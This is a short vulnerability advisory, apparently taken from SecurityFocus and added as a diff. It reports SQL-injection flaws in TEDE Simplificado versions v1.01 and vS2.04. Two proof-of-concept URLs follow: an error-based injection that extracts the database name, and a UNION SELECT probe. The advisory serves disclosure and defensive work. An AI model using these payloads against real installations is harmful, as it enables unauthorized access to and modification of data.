@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/48067/info
+
+TEDE Simplificado is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+TEDE Simplificado v1.01 and vS2.04 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/tde_busca/processaPesquisa.php?pesqExecutada=1&id=663%20and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20concat%280x7e,0x27,unhex%28hex%28database%28%29%29%29,0x27,0x7e%29%29%20from%20information_schema.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201=1
+
+http://www.example.com/tde_busca/tde_fut.php?id=10%20union%20select%201,2,3,4 
